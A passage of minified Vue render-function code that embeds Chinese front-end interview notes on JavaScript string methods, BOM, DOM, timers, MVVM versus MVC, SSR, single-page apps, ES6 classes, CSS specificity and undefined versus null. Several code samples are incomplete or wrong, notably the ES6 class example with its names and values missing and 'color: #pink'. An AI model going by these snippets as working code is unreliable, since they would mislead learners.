")])])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",[t("strong",[t("span",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("79、")]),n._v("字符串常用方法")])]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}},[n._v("slice方法返回字符串的片段")])]),t("span",{staticStyle:{color:"rgb(34,34,34)"}},[t("br")]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}},[n._v('var str = "ABCDEF";')]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(34,34,34)"}},[t("br")]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}},[n._v("str.slice(2,4);")]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(34,34,34)"}},[t("br")]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}},[n._v("CD")]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}},[n._v("substring方法返回位于String对象中指定位置的子字符串。")])]),t("span",{staticStyle:{color:"rgb(34,34,34)"}},[t("br")]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}},[n._v('var str = "ABCDEF";')]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(34,34,34)"}},[t("br")]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}},[n._v("str.substring(2,4); // 或 str.substring(4,2);")]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(34,34,34)"}},[t("br")]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}},[n._v("CD")]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}},[n._v("Split")])]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}}),t("strong",[t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}})]),t("span",{staticStyle:{color:"rgb(34,34,34)"}},[t("br")]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}},[n._v('var str = "AA BB CC DD EE FF";')]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(34,34,34)"}},[t("br")]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}},[n._v('alert(str.split(" "，3));')]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(34,34,34)"}},[t("br")]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(34,34,34)"}},[t("br")]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}},[n._v("AA,BB,CC")]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}},[n._v("concat方法返回字符串值")])]),t("span",{staticStyle:{color:"rgb(34,34,34)"}},[t("br")]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}},[n._v('var str = "ABCDEF";')]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(34,34,34)"}},[t("br")]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}},[n._v('str.concat("ABCDEF","ABC");')]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(34,34,34)"}},[t("br")]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}},[n._v("ABCDEFABCDEFABC")]),t("strong")]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}},[n._v("indexOf方法放回String对象内第一次出现子字符串位置")])]),t("span",{staticStyle:{color:"rgb(34,34,34)"}},[t("br")]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}},[n._v('var str = "ABCDECDF";')]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(34,34,34)"}},[t("br")]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}},[n._v('str.indexOf("CD"，1); // 由1位置从左向右查找 123...')]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(34,34,34)"}},[t("br")]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}},[n._v("2")]),t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(34,34,34)",background:"rgb(255,255,255)"}},[n._v("80、")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v(" (BOM)")])])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("BOM 的方法和属性")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v(" window 对象的属性。")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v(" window 对象的方法。")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("Window 子对象")])])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("document 对象")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("frames 对象")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("history 对象")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("location 对象")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("navigator 对象")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("screen 对象")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(253,252,248)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(253,252,248)"}},[n._v("81、DOM")]),t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(253,252,248)"}}),t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(253,252,248)"}},[n._v("HTML 文档对象模型")])]),t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(253,252,248)"}},[n._v("\n        DOM，可以访问所有的 HTML 元素，连同它们所包含的文本和属性")])]),t("p",[t("span",{staticStyle:{color:"rgb(102,102,102)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[n._v("82、js 定时器有以下两个方法：")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("setInterval()\n        ：按照指定的周期（以毫秒计）来调用函数或计算表达式。方法会不停地调用函数，直到\n        clearInterval() 被调用或窗口被关闭。")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("setTimeout() ：在指定的毫秒数后调用函数或计算表达式。")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(51,51,51)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("83、MVVM和MVC的区别")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("MVVM中的View 和 ViewModel可以互相通信。也就是可以互相调用。")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[t("br")]),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("MVC中的是单向通信。也就是View跟Model，必须通过Controller来承上启下")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("84、服务端渲染，英文缩写")]),t("span",{staticStyle:{color:"rgb(85,85,85)",background:"rgb(255,255,255)"}},[n._v("SSR")])])]),t("p",[t("span",{staticStyle:{color:"rgb(85,85,85)",background:"rgb(255,255,255)"}},[n._v("Vue.js原来是开发SPA（单页应用）的，但是随着技术的普及，很多人想用Vue开发多页应用，并在服务端完成渲染。可以用Nuxt.js实现，她简化了SSR的开发难度。还可以直接用命令把我们制作的vue项目生成为静态html。")])]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(85,85,85)",background:"rgb(255,255,255)"}})])]),t("p",[t("span",{staticStyle:{color:"rgb(85,85,85)",background:"rgb(255,255,255)"}},[n._v("SPA（单页应用）不利于搜索引擎的SEO操作。比如你作一个新闻网站，流量的一个主要来源是通过百度、谷歌、bing这些搜索引擎，但是它们对SPA的抓取并不好，特别是百度根本没法抓取到SPA的内容页面，所以我们必须把我们的应用在服务端渲染成适合搜索引擎抓取的页面，再下载到客户端。那Nuxt.js适合作新闻、博客、电影、咨询这样的需要搜索引擎提供流量的项目。")])]),t("p",[t("span",{staticStyle:{color:"rgb(85,85,85)",background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(85,85,85)",background:"rgb(255,255,255)"}},[n._v("85、")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}})])]),t("p",{staticStyle:{background:"rgb(255,255,255)"},attrs:{align:"justify"}},[n._v("\n      webapp就一个HTML文件，里面的各个功能页面是JavaScript通过hash或者history\n      api来进行路由，并通过ajax 拉取数据实现响应功能。\n    ")]),t("p",{staticStyle:{background:"rgb(255,255,255)"},attrs:{align:"justify"}},[t("strong",[n._v("优点")]),n._v("：\n    ")]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("分离前后端关注点，前端负责界面显示，后端负责数据存储和计算，各司其职，不会把前后端的逻辑混杂在一起；")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("减轻服务器压力，服务器只用出数据就可以，不用管展示逻辑和页面合成，吞吐能力会提高几倍；")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("Web界面、手机、平板等多种客户端；")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"},attrs:{align:"justify"}},[t("strong",[n._v("缺点")]),n._v("：\n    ")]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("SEO问题，现在可以通过Prerender等技术解决一部分；")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("前进、后退、地址栏等，需要程序进行管理；")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("书签，需要程序来提供支持；")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("86 、ES6定义类和继承")])])]),t("p",{staticStyle:{background:"rgb(246,246,246)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(26,26,26)"}},[n._v("class")])]),t("span",{staticStyle:{color:"rgb(26,26,26)"}}),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("//")]),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("定义类")])]),t("p",{staticStyle:{background:"rgb(246,246,246)"}},[t("span",{staticStyle:{color:"rgb(26,26,26)"}}),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("//")]),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("构造函数")])]),t("p",{staticStyle:{background:"rgb(246,246,246)"}},[t("span",{staticStyle:{color:"rgb(26,26,26)"}}),t("strong",[t("span",{staticStyle:{color:"rgb(26,26,26)"}},[n._v("this")])]),t("span",{staticStyle:{color:"rgb(26,26,26)"}},[n._v(".name ")]),t("strong",[t("span",{staticStyle:{color:"rgb(26,26,26)"}},[n._v("=")])]),t("span",{staticStyle:{color:"rgb(26,26,26)"}})]),t("p",{staticStyle:{background:"rgb(246,246,246)"}},[t("span",{staticStyle:{color:"rgb(26,26,26)"}})]),t("p",{staticStyle:{background:"rgb(246,246,246)"}},[t("span",{staticStyle:{color:"rgb(26,26,26)"}})]),t("p",{staticStyle:{background:"rgb(246,246,246)"}},[t("span",{staticStyle:{color:"rgb(26,26,26)"}})]),t("p",{staticStyle:{background:"rgb(246,246,246)"}},[t("span",{staticStyle:{color:"rgb(26,26,26)"}}),t("strong",[t("span",{staticStyle:{color:"rgb(26,26,26)"}},[n._v("return")])]),t("span",{staticStyle:{color:"rgb(26,26,26)"}}),t("strong",[t("span",{staticStyle:{color:"rgb(26,26,26)"}},[n._v("this")])]),t("span",{staticStyle:{color:"rgb(26,26,26)"}},[n._v(".name;")])]),t("p",{staticStyle:{background:"rgb(246,246,246)"}},[t("span",{staticStyle:{color:"rgb(26,26,26)"}})]),t("p",{staticStyle:{background:"rgb(246,246,246)"}},[t("span",{staticStyle:{color:"rgb(26,26,26)"}},[n._v("}")])]),t("p",{staticStyle:{background:"rgb(246,246,246)"}},[t("span",{staticStyle:{color:"rgb(26,26,26)"}})]),t("p",{staticStyle:{background:"rgb(246,246,246)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(26,26,26)"}},[n._v("class")])]),t("span",{staticStyle:{color:"rgb(26,26,26)"}}),t("strong",[t("span",{staticStyle:{color:"rgb(26,26,26)"}},[n._v("extends")])]),t("span",{staticStyle:{color:"rgb(26,26,26)"}}),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("//")]),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("继承")])]),t("p",{staticStyle:{background:"rgb(246,246,246)"}},[t("span",{staticStyle:{color:"rgb(26,26,26)"}})]),t("p",{staticStyle:{background:"rgb(246,246,246)"}},[t("span",{staticStyle:{color:"rgb(26,26,26)"}}),t("strong",[t("span",{staticStyle:{color:"rgb(26,26,26)"}},[n._v("this")])]),t("span",{staticStyle:{color:"rgb(26,26,26)"}},[n._v(".grade ")]),t("strong",[t("span",{staticStyle:{color:"rgb(26,26,26)"}},[n._v("=")])]),t("span",{staticStyle:{color:"rgb(26,26,26)"}}),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("// ReferenceError")]),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("：如果没有")]),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("super")]),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("直接调用")]),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("this. Grade,")]),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("会报错")])]),t("p",{staticStyle:{background:"rgb(246,246,246)"}},[t("span",{staticStyle:{color:"rgb(26,26,26)"}}),t("strong",[t("span",{staticStyle:{color:"rgb(26,26,26)"}},[n._v("super")])]),t("span",{staticStyle:{color:"rgb(26,26,26)"}}),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("//")]),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("子类必须在")]),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("constructor")]),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("方法中调用")]),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("super")]),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("，否则新建实例会报错，因为子类没有自己的")]),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("this")]),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("对象")])]),t("p",{staticStyle:{background:"rgb(246,246,246)"}},[t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("super ")]),t("span",{staticStyle:{color:"rgb(255,0,0)"}},[n._v("作为函数调用时代表父类的构造函数")])]),t("p",{staticStyle:{background:"rgb(246,246,246)"}},[t("span",{staticStyle:{color:"rgb(26,26,26)"}}),t("strong",[t("span",{staticStyle:{color:"rgb(26,26,26)"}},[n._v("this")])]),t("span",{staticStyle:{color:"rgb(26,26,26)"}},[n._v(".grade ")]),t("strong",[t("span",{staticStyle:{color:"rgb(26,26,26)"}},[n._v("=")])]),t("span",{staticStyle:{color:"rgb(26,26,26)"}})]),t("p",{staticStyle:{background:"rgb(246,246,246)"}},[t("span",{staticStyle:{color:"rgb(26,26,26)"}})]),t("p",{staticStyle:{background:"rgb(246,246,246)"}},[t("span",{staticStyle:{color:"rgb(26,26,26)"}})]),t("p",{staticStyle:{background:"rgb(246,246,246)"}},[t("span",{staticStyle:{color:"rgb(26,26,26)"}}),t("strong",[t("span",{staticStyle:{color:"rgb(26,26,26)"}},[n._v("return")])]),t("span",{staticStyle:{color:"rgb(26,26,26)"}}),t("strong",[t("span",{staticStyle:{color:"rgb(26,26,26)"}},[n._v("this")])]),t("span",{staticStyle:{color:"rgb(26,26,26)"}},[n._v(".grade;")])]),t("p",{staticStyle:{background:"rgb(246,246,246)"}},[t("span",{staticStyle:{color:"rgb(26,26,26)"}})]),t("p",{staticStyle:{background:"rgb(246,246,246)"}},[t("span",{staticStyle:{color:"rgb(26,26,26)"}},[n._v("}")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(26,26,26)"}},[n._v("Student(“Bill” , 5)")])]),t("p",[t("span",{staticStyle:{color:"rgb(26,26,26)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(26,26,26)"}},[n._v("87、样式权重")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v(": style=””，权值为1000。")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("ID选择器，如：#content，权值为100。")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v(".content，权值为10。")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("div p，权值为1。")])]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}},[n._v("<")]),t("span",{staticStyle:{color:"rgb(86,156,214)"}},[n._v("style")]),t("span",{staticStyle:{color:"rgb(128,128,128)"}},[n._v(">")])]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(215,186,125)"}},[n._v("#aaa")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}})]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(156,220,254)"}},[n._v("color")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}},[n._v(": ")]),t("span",{staticStyle:{color:"rgb(206,145,120)"}},[n._v("red")])]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}})]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(215,186,125)"}},[n._v(".bbb")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}})]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(156,220,254)"}},[n._v("color")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}},[n._v(": ")]),t("span",{staticStyle:{color:"rgb(206,145,120)"}},[n._v("blue")])]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}})]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(215,186,125)"}},[n._v("div p")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}})]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(156,220,254)"}},[n._v("color")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}},[n._v(": #")]),t("span",{staticStyle:{color:"rgb(206,145,120)"}},[n._v("pink")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}},[n._v(";")])]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}})]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(128,128,128)"}},[n._v("</")]),t("span",{staticStyle:{color:"rgb(86,156,214)"}},[n._v("style")]),t("span",{staticStyle:{color:"rgb(128,128,128)"}},[n._v(">")])]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}},[n._v("</")]),t("span",{staticStyle:{color:"rgb(86,156,214)"}},[n._v("head")]),t("span",{staticStyle:{color:"rgb(128,128,128)"}},[n._v(">")])]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}},[n._v("<")]),t("span",{staticStyle:{color:"rgb(86,156,214)"}},[n._v("body")]),t("span",{staticStyle:{color:"rgb(128,128,128)"}},[n._v(">")])]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(128,128,128)"}},[n._v("<")]),t("span",{staticStyle:{color:"rgb(86,156,214)"}},[n._v("div")]),t("span",{staticStyle:{color:"rgb(128,128,128)"}},[n._v(">")])]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(128,128,128)"}},[n._v("<")]),t("span",{staticStyle:{color:"rgb(86,156,214)"}},[n._v("p")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}}),t("span",{staticStyle:{color:"rgb(156,220,254)"}},[n._v("id")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}},[n._v("=")]),t("span",{staticStyle:{color:"rgb(206,145,120)"}},[n._v('"aaa"')]),t("span",{staticStyle:{color:"rgb(212,212,212)"}}),t("span",{staticStyle:{color:"rgb(156,220,254)"}},[n._v("class")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}},[n._v("=")]),t("span",{staticStyle:{color:"rgb(206,145,120)"}},[n._v('"bbb"')]),t("span",{staticStyle:{color:"rgb(212,212,212)"}}),t("span",{staticStyle:{color:"rgb(156,220,254)"}},[n._v("style")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}},[n._v("=")]),t("span",{staticStyle:{color:"rgb(206,145,120)"}},[n._v('"color:green"')]),t("span",{staticStyle:{color:"rgb(128,128,128)"}},[n._v(">")]),t("span",{staticStyle:{color:"rgb(212,212,212)"}},[n._v("我的大学生活")]),t("span",{staticStyle:{color:"rgb(128,128,128)"}},[n._v("</")]),t("span",{staticStyle:{color:"rgb(86,156,214)"}},[n._v("p")]),t("span",{staticStyle:{color:"rgb(128,128,128)"}},[n._v(">")])]),t("p",{staticStyle:{background:"rgb(30,30,30)"}},[t("span",{staticStyle:{color:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(128,128,128)"}},[n._v("</")]),t("span",{staticStyle:{color:"rgb(86,156,214)"}},[n._v("div")]),t("span",{staticStyle:{color:"rgb(128,128,128)"}},[n._v(">")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("3个规则,：")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("1，如果样式上加有!important标记，例如：")])]),t("table",{attrs:{border:"0",cellspacing:"0"}},[t("tbody",[t("tr",[t("td",[t("p")]),t("td",[t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}})])])])])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("那么始终采用这个标记的样式。")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("2，匹配的内容按照CSS权重排序，权重大的优先；")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("3，如果权重也一样，按照它在CSS样式表里声明的顺序，后声明的优先，例如：")])]),t("table",{attrs:{border:"0",cellspacing:"0"}},[t("tbody",[t("tr",[t("td",[t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}})])]),t("td",[t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}})])])])])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("color: red。")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("88、undefined和null区别")])])]),t("p",{staticStyle:{background:"rgb(245,245,213)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(17,17,17)"}},[n._v('null表示"没有对象"，即该处不应该有值。')])]),t("span",{staticStyle:{color:"rgb(17,17,17)"}},[n._v("典型用法是：")])]),t("p",{staticStyle:{background:"rgb(245,242,240)"}},[t("span",{staticStyle:{color:"rgb(17,17,17)"}},[n._v("1） 作为函数的参数，表示该函数的参数不是对象。")])]),t("p",{staticStyle:{background:"rgb(245,245,213)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(17,17,17)"}},[n._v('undefined表示"缺少值"，就是此处应该有一个值，但是还没有定义。')])]),t("span",{staticStyle:{color:"rgb(17,17,17)"}},[n._v("典型用法是：")])]),t("p",{staticStyle:{background:"rgb(245,242,240)"}},[t("span",{staticStyle:{color:"rgb(17,17,17)"}},[n._v("1）变量被声明了，但没有赋值时，就等于undefined。")])]),t("p",{staticStyle:{background:"rgb(245,242,240)"}},[t("span",{staticStyle:{color:"rgb(17,17,17)"}},[n._v("2) 调用函数时，应该提供的参数没有提供，该参数等于undefined。")])]),t("p",{staticStyle:{background:"rgb(245,242,240)"}},[t("span",{staticStyle:{color:"rgb(17,17,17)"}},[n._v("3）对象没有赋值的属性，该属性的值为undefined。")])]),t("p",{staticStyle:{background:"rgb(245,242,240)"}},[t("span",{staticStyle:{color:"rgb(17,17,17)"}},[n._v("4）函数没有返回值时，默认返回undefined。")])]),t("p",{staticStyle:{background:"rgb(245,242,240)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",{staticStyle:{background:"rgb(245,242,240)"}},[t("span",{staticStyle:{color:"rgb(0,119,170)"}},[n._v("var")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(153,153,153)"}},[n._v(";")])]),t("p",{staticStyle:{background:"rgb(245,242,240)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("i")]),t("span",{staticStyle:{color:"rgb(112,128,144)"}})]),t("p",{staticStyle:{background:"rgb(245,242,240)"}},[t("span",{staticStyle:{c